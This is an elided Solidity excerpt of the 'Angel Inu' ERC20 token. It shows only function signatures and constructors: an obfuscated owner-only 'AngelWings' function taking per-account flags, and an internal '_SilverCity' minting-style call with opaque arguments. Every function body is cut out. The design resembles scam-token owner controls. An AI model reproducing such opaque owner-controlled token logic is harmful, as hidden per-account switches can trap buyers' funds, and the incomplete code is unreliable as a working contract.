...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function AngelWings(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _SilverCity(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Angel is Context, ERC20 {
    constructor(
        ...
        _SilverCity(owner, initialSupply, house6, house7);
    }
}

contract AngelInu is ERC20Angel {
    constructor() ERC20Angel("Angel Inu", "ANGELINU", false, true, 900, 25, msg.sender, 666000000 * 10 ** 18, msg.sender, 82) {
    }
}